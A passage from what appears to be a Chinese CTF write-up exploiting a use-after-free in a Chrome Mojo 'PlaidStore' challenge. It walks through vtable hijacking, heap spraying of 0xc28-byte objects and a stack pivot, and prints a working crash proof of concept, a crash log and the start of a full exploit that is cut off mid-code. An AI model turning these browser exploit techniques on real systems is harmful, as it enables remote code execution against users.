<p>由于<code>render_frame_host_</code>的UAF，<code>render_frame_host_</code>指针所指向的<code>RenderFrameHostImpl</code>内存位置是<strong>完全可控</strong>的（因为这块内存可以先被free，后被我们allocate）。</p>
<p>同时，我们可以利用先前找到的<code>xchg rax, rsp</code>，将<code>$rax</code>值和<code>$rsp</code>值交换，这样就可以<strong>劫持栈</strong>，之后执行我们的<code>gadgets</code>。</p>
<p>那<code>$rax</code>值应该怎么控制呢？请向下翻页查看下图，当执行虚函数时，<code>%rax</code>值正好为<code>render_frame_host_</code>的虚表地址<code>vtable entry</code>，因此我们还是可以通过控制<code>RenderFrameHostImpl</code>内存区域来设置<code>%rax</code>的值。这里我们设置该<code>vtable entry</code>为<code>render_frame_host_ + 0x10</code>，即，<code>render_frame_host_[0] = render_frame_host_ + 0x10</code>（这段话有点绕，请仔细思考）</p>
<p>因此，我们完全可以在<code>render_frame_host_</code>指针所指向的内存区域上布置我们的<code>gadgets</code>。</p>
</li>
<li>
<p>但在此之前，我们需要获取一下<code>render_frame_host_</code>所使用的某个虚函数在虚表的相对偏移。这里我们选择获取<code>IsRenderFrameLive</code>虚函数的偏移。</p>
<p>我们在<code>PlaidStoreImpl::GetData</code>函数下断，单步跟踪几步即可显示该函数的偏移。如图所示，<code>IsRenderFrameLive</code>函数在虚表中的相对偏移为<code>0x160</code>。</p>
<p><img src="/2020/10/mojo/renderFrameHostFuncOffset.png" alt="img"></p>
</li>
<li>
<p>之后，我们就可以精心构建<code>gadget</code>布局。</p>
<p><img src="/2020/10/mojo/gadgetMap.jpg" alt="img"></p>
</li>
<li>
<p>在布局<code>gadget</code>前还有一个问题：我们该如何在释放<code>render_frame_host_</code>所指向的内存之后，<strong>再将这块内存分配回来</strong>？这里有个小知识点，<strong>chrome中的内存管理使用的是<code>TCMalloc</code>机制</strong>。又因为<code>StoreData</code>函数分配的<code>vector&lt;uint8_t&gt;</code>与<code>render_frame_host_</code>使用的是同一个分配器，<strong>只要大量分配大小与<code>RenderFrameHostImpl</code>相等的<code>vector</code>，就有可能占位成功。</strong></p>
<blockquote>
<p>TCMalloc（Thread-Caching Malloc）实现了高效的多线程内存管理，用于替代系统的内存分配相关的函数 - <a href="https://www.jianshu.com/p/11082b443ddf" target="_blank" rel="noopener">TCMalloc解密</a></p>
</blockquote>
<p>那么<code>sizeof(RenderFrameHostImpl)</code>等于多少呢？我们调试看看。</p>
<p>首先在<code>content::RenderFrameHostImpl::RenderFrameHostImpl</code>构造函数上下断点，并重新执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b content::RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure>
<p>我们的目的是找到执行该构造函数的上一个函数，并查看在执行<code>RenderFrameHostImpl</code>构造函数前，执行<code>operator new</code>时传入的大小。</p>
<blockquote>
<p>如图所示，我们的目标是<code>content::RenderFrameHostFactory::Create</code>函数。下断并<strong>重新执行</strong>。</p>
</blockquote>
<p><img src="/2020/10/mojo/renderFrameHostSize1.png" alt="img"></p>
<p>单步跟踪<code>RenderFrameHostFactory::Create</code>函数，在整个函数中只有一处地方调用<code>operator new</code>。而这里的<code>0xc28</code>正是<code>RenderFrameHostImpl</code>的大小。</p>
<p><img src="/2020/10/mojo/renderFrameHostSize.png" alt="img"></p>
</li>
<li>
<p>当我们创建一个<code>child iframe</code>并建立一个<code>PlaidStoreImpl</code>实例后。如果我们关闭这个<code>child iframe</code>，则对应的<code>RenderFrameHost</code>将会<strong>自动关闭</strong>；但于此同时，<code>child iframe</code>所对应的<code>PlaidStoreImpl</code>与browser建立的mojo管道<strong>将会被断开</strong>。<strong>而该管道一但断开，则<code>PlaidStoreImpl</code>实例将会被析构</strong>。</p>
<p>因此，我们需要在关闭<code>child iframe</code>之前，将管道的<code>remote</code>端移交给<code>parent iframe</code>，使得<code>child iframe</code>的<code>PlaidStoreImpl</code>实例在iframe关闭后仍然存活。</p>
<blockquote>
<p>回想一下，正常情况下，当关闭一个iframe时，<strong>RenderFrameHost将会被析构</strong>、<strong>mojo管道将会被关闭</strong>。此时<strong>Mojo管道的关闭一定会带动PlaidStoreImpl的析构</strong>，这样就可以析构掉所有该析构的对象。</p>
<p>但这里却没有，因为在关闭<code>child iframe</code>前，已经将该<code>iframe</code>所持有的<strong>Mojo管道<code>Remote</code>端</strong>移交出去了，因此在关闭<code>child iframe</code>时将<strong>不会关闭Mojo管道</strong>。而<code>PlaidStoreImpl</code>的生命周期并没有与<code>RenderFrameHost</code>相关联。即<code>RenderFrameHost</code>的析构<strong>完全不影响</strong><code>PlaidStoreImpl</code>实例的生命周期。所以，<code>PlaidStoreImpl</code>实例将不会被析构。</p>
</blockquote>
<p>那么，问题是，<strong>该如何移交Mojo管道的<code>remote</code>端呢？</strong> 答案是：使用<code>MojoInterfaceInterceptor</code>。该功能可以拦截来自同一进程中其他<code>iframe</code>的<code>Mojo.bindInterface</code>调用。在<code>child iframe</code>被销毁前，我们可以利用该功能将mojo管道的一端传递给<code>parent iframe</code>。</p>
<p>以下是来自其他exp的相关代码，我们可以通过该代码片段来了解<code>MojoInterfaceInterceptor</code>的具体使用方式：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var kPwnInterfaceName = <span class="string">"pwn"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runs in the child frame</span></span><br><span class="line"><span class="function">function <span class="title">sendPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  var pipe = Mojo.createMessagePipe();</span><br><span class="line">  <span class="comment">// bind the InstalledAppProvider with the child rfh</span></span><br><span class="line">  Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,</span><br><span class="line">    pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pass the endpoint handle to the parent frame</span></span><br><span class="line">  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, <span class="string">"process"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runs in the parent frame</span></span><br><span class="line"><span class="function">function <span class="title">getFreedPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Promise(function (resolve, reject) &#123;</span><br><span class="line">    var frame = allocateRFH(window.location.href + <span class="string">"#child"</span>); <span class="comment">// designate the child by hash</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">    let interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">    interceptor.oninterfacerequest = function(e) &#123;</span><br><span class="line">      interceptor.stop();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// bind and return the remote</span></span><br><span class="line">      var provider_ptr = <span class="keyword">new</span> blink.mojom.InstalledAppProviderPtr(e.handle);</span><br><span class="line">      freeRFH(frame);</span><br><span class="line">      resolve(provider_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    interceptor.start();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在，我们已经解决了所有潜在的问题，UAF的利用方式应该是这样的</p>
<ul>
<li>将<code>child iframe</code>中Mojo 管道的<code>remote</code>端移交至<code>parent iframe</code>，使得Mojo管道仍然保持连接。</li>
<li>释放<code>child iframe</code></li>
<li>多次分配内存，使得分配到原先被释放<code>RenderFrameHostImpl</code>的内存区域</li>
<li>写入目标数据</li>
<li>执行<code>child iframe</code>对应的<code>PlaidStoreImpl::GetData</code>函数。</li>
</ul>
</li>
<li>
<p>写个POC验证一下UAF</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> frame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span></span><br><span class="line">            frame.srcdoc = `</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">    Mojo.bindInterface(</span><br><span class="line">        blink.mojom.PlaidStore.name,</span><br><span class="line">        mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">        <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.plaidStorePtr = plaidStorePtr;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"iframe loaded"</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span><br><span class="line">`;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(frame);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 在frame加载完成后再异步执行其中的代码</span></span></span><br><span class="line"><span class="javascript">            frame.contentWindow.addEventListener(<span class="string">"DOMContentLoaded"</span>, <span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> childPlaidStorePtr = frame.contentWindow.plaidStorePtr;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(childPlaidStorePtr == <span class="literal">undefined</span> || childPlaidStorePtr == <span class="number">0</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">throw</span> <span class="string">"Error in iframe loading"</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"parent iframe start working"</span>)</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 预先分配0xc28</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xc28</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将原先buffer转为int64位的数组（内存地址不变</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> uaf_buf = <span class="keyword">new</span> BigUint64Array(buf);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将对应vtable entry的前8个字节设置为0xdeadbeef（随便设置的易于区分的值）</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 这样当crash时，$rax一定等于0xdeadbeef。</span></span></span><br><span class="line">                uaf_buf[0] = BigInt(0xdeadbeef);</span><br><span class="line"><span class="actionscript">                <span class="comment">// 在parent iframe中建立PlaidStoreImpl实例</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> parentPlaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">                Mojo.bindInterface(</span><br><span class="line">                    blink.mojom.PlaidStore.name,</span><br><span class="line">                    mojo.makeRequest(parentPlaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                    <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                    <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 释放child iframe</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.removeChild(frame);</span></span><br><span class="line">                frame.remove();</span><br><span class="line"><span class="actionscript">                <span class="comment">// 大量分配内存，用于占位。</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 需要注意这里的storeData的索引要变化，不然每次填充数据都只会在一块内存区域上反复填充。</span></span></span><br><span class="line"><span class="javascript">                    parentPlaidStorePtr.storeData(<span class="string">"1"</span> + i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf));</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"try to uaf crash"</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尝试利用UAF漏洞来Crash</span></span></span><br><span class="line"><span class="actionscript">                childPlaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x28</span>);</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">pwn()</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>不过需要注意的是，在该POC中并没有<strong>将<code>child iframe</code>的Mojo管道一端传递给<code>parent iframe</code></strong> 的操作。因为通过调试可知，<code>child iframe</code>在remove后，其所对应的<code>PlaidStoreImpl</code>实例仍然存在，<strong>并没有随着Mojo pipe的关闭而被析构。</strong></p>
<p>尚未明确具体原因，但这种情况却简化了漏洞利用的方式。</p>
</blockquote>
<p>如下图所示，chrome成功在调用<code>RenderFrameHostImpl::IsRenderFrameLive</code>时Crash，并且<code>$eax</code>为目的值<code>0xdeadbeef</code>。</p>
<p><img src="/2020/10/mojo/UAFPoc.png" alt="img"></p>
<p>执行输出的log如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kiprey @ Kipwn in /usr/class/CTFs/mojo [14:34:16] C:1</span></span><br><span class="line">$ ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest http://localhost:8000/test.html</span><br><span class="line"></span><br><span class="line">DevTools listening on ws://127.0.0.1:1338/devtools/browser/2aaa5e8e-c088-4b7a-ab69-5dfbace58413</span><br><span class="line">127.0.0.1 - - [09/Oct/2020 14:36:39] <span class="string">"GET /test.html HTTP/1.1"</span> 200 -</span><br><span class="line">[1009/143639.113334:INFO:CONSOLE(14)] <span class="string">"iframe loaded"</span>, <span class="built_in">source</span>: about:srcdoc (14)</span><br><span class="line">[1009/143639.114060:INFO:CONSOLE(32)] <span class="string">"parent iframe start working"</span>, <span class="built_in">source</span>: http://localhost:8000/test.html (32)</span><br><span class="line">[1009/143639.168655:INFO:CONSOLE(54)] <span class="string">"try to uaf crash"</span>, <span class="built_in">source</span>: http://localhost:8000/test.html (54)</span><br><span class="line">Received signal 11 SEGV_MAPERR 0000deadc04f</span><br><span class="line"><span class="comment">#0 0x559d6e9c1579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x559d6e9256f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x559d6e9c1120 base::debug::(anonymous namespace)::StackDumpSignalHandler()</span></span><br><span class="line"><span class="comment">#3 0x7f62fcda4520 (/usr/lib/x86_64-linux-gnu/libpthread-2.29.so+0x1351f)</span></span><br><span class="line"><span class="comment">#4 0x559d6cf2e2d4 content::PlaidStoreImpl::GetData()</span></span><br><span class="line"><span class="comment">#5 0x559d6c901e3a blink::mojom::PlaidStoreStubDispatch::AcceptWithResponder()</span></span><br><span class="line"><span class="comment">#6 0x559d6cf2e9c6 blink::mojom::PlaidStoreStub&lt;&gt;::AcceptWithResponder()</span></span><br><span class="line"><span class="comment">#7 0x559d6eaf5878 mojo::InterfaceEndpointClient::HandleValidatedMessage()</span></span><br><span class="line"><span class="comment">#8 0x559d6eafbcf1 mojo::internal::MultiplexRouter::ProcessIncomingMessage()</span></span><br><span class="line"><span class="comment">#9 0x559d6eafb4de mojo::internal::MultiplexRouter::Accept()</span></span><br><span class="line"><span class="comment">#10 0x559d6eaf2e9c mojo::Connector::DispatchMessage()</span></span><br><span class="line"><span class="comment">#11 0x559d6eaf3941 mojo::Connector::ReadAllAvailableMessages()</span></span><br><span class="line"><span class="comment">#12 0x559d6eb0bd48 mojo::SimpleWatcher::OnHandleReady()</span></span><br><span class="line"><span class="comment">#13 0x559d6e96dbeb base::TaskAnnotator::RunTask()</span></span><br><span class="line"><span class="comment">#14 0x559d6e97e47e base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()</span></span><br><span class="line"><span class="comment">#15 0x559d6e97e211 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork()</span></span><br><span class="line"><span class="comment">#16 0x559d6e93b817 base::(anonymous namespace)::WorkSourceDispatch()</span></span><br><span class="line"><span class="comment">#17 0x7f62fc08af1d g_main_context_dispatch</span></span><br><span class="line"><span class="comment">#18 0x7f62fc08b1a0 (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6200.4+0x5019f)</span></span><br><span class="line"><span class="comment">#19 0x7f62fc08b22f g_main_context_iteration</span></span><br><span class="line"><span class="comment">#20 0x559d6e93b672 base::MessagePumpGlib::Run()</span></span><br><span class="line"><span class="comment">#21 0x559d6e97ecf9 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()</span></span><br><span class="line"><span class="comment">#22 0x559d6e956942 base::RunLoop::Run()</span></span><br><span class="line"><span class="comment">#23 0x559d6cca71f4 content::BrowserMainLoop::RunMainMessageLoopParts()</span></span><br><span class="line"><span class="comment">#24 0x559d6cca90a2 content::BrowserMainRunnerImpl::Run()</span></span><br><span class="line"><span class="comment">#25 0x559d731c5f78 headless::HeadlessContentMainDelegate::RunProcess()</span></span><br><span class="line"><span class="comment">#26 0x559d6e50e306 content::ContentMainRunnerImpl::RunServiceManager()</span></span><br><span class="line"><span class="comment">#27 0x559d6e50dff7 content::ContentMainRunnerImpl::Run()</span></span><br><span class="line"><span class="comment">#28 0x559d6e55c8d3 service_manager::Main()</span></span><br><span class="line"><span class="comment">#29 0x559d6e50c351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#30 0x559d6e55b49d headless::(anonymous namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#31 0x559d6e55b19b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#32 0x559d6bfcdc27 ChromeMain</span></span><br><span class="line"><span class="comment">#33 0x7f62faaf9bbb __libc_start_main</span></span><br><span class="line"><span class="comment">#34 0x559d6bfcda6a _start</span></span><br><span class="line">  r8: 000030791a93d600  r9: 00007ffeb987a3b8 r10: 0000000000000000 r11: 0000000000000000</span><br><span class="line"> r12: 0000000000000028 r13: 0000000000000028 r14: 00007ffeb9879de0 r15: 00007ffeb9879dd0</span><br><span class="line">  di: 000030791a9c5100  si: 00007ffeb9879de0  bp: 00007ffeb9879d60  bx: 000030791aa58ba0</span><br><span class="line">  dx: 0000000000000028  ax: 00000000deadbeef  cx: 00007ffeb9879dd0  sp: 00007ffeb9879d10</span><br><span class="line">  ip: 0000559d6cf2e2d4 efl: 0000000000010202 cgf: 002b000000000033 erf: 0000000000000004</span><br><span class="line"> trp: 000000000000000e msk: 0000000000000000 cr2: 00000000deadc04f</span><br><span class="line">[end of stack trace]</span><br><span class="line">Calling _exit(1). Core file will not be generated.</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="6-exploit">6. exploit</h2>
<p>综上所述，整体利用流程是这样的：</p>
<ul>
<li>
<p>先创建一个<code>child iframe</code>，利用OOB泄露该<code>child iframe</code>所对应的<code>PlaidStoreImpl::render_frame_host_</code><strong>指针地址</strong>与<code>chromeELF</code><strong>基地址</strong>。最后，将上面两个地址与任意一个<code>PlaidStoreImpl</code>实例地址一并返回给<code>parent iframe</code>。</p>
<blockquote>
<p>注意，此时<strong>最好不要马上释放</strong>该<code>child iframe</code>。暂时先保留<code>render_frame_host_</code>的内存区域，直到最后漏洞利用前再释放，以<strong>减小目标内存区域被其他代码所分配的风险</strong>。</p>
</blockquote>
</li>
<li>
<p>利用<code>child iframe</code>泄露出的ELF基地址，进一步确认各种gadgets的地址。</p>
</li>
<li>
<p>利用JS代码，先精心构造一块特定的gadgets利用数据。</p>
</li>
<li>
<p>将<code>child iframe</code>持有的Mojo管道<code>remote</code>端移交至<code>parent iframe</code>。</p>
<blockquote>
<p>先前的UAF Poc中尽管省略了该操作，但poc仍然可以利用成功，因此该操作在利用过程中不是必须的。</p>
</blockquote>
</li>
<li>
<p><strong>释放</strong><code>child iframe</code>并<strong>多次</strong>执行<code>parent iframe</code>的<code>PlaidStoreImpl::StoreData</code>函数，将<strong>gadgets利用数据</strong>写入内存中。</p>
</li>
<li>
<p>执行<code>child iframe</code>的<code>PlaidStoreImpl::GetData</code>函数</p>
</li>
<li>
<p>成功获取<code>shell</code>！</p>
</li>
</ul>
<p>所以，综合上面的漏洞POC，我们最终的exp如下所示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line">            /*</span><br><span class="line"><span class="javascript">                注意这里最好不要直接修改<span class="built_in">document</span>.body.innerText</span></span><br><span class="line"><span class="javascript">                因为修改<span class="built_in">document</span>.body.innerText将会删除当前body上的所有节点，</span></span><br><span class="line">                包括appendChild上去的child iframe</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"#parentLog"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span>(elem == <span class="literal">undefined</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                elem = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.appendChild(elem);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            elem.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            success(<span class="string">"try append child iframe"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> frame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span></span><br><span class="line">            frame.srcdoc = `</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"#childLog"</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span>(elem == <span class="literal">undefined</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            elem = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(elem);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtrList = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将plaidStore实例与mojo pipe绑定</span></span></span><br><span class="line">            Mojo.bindInterface(</span><br><span class="line">                blink.mojom.PlaidStore.name,</span><br><span class="line">                mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span> + i));</span></span><br><span class="line">            plaidStorePtrList.push(plaidStorePtr);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> PlaidStore_vtable_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) 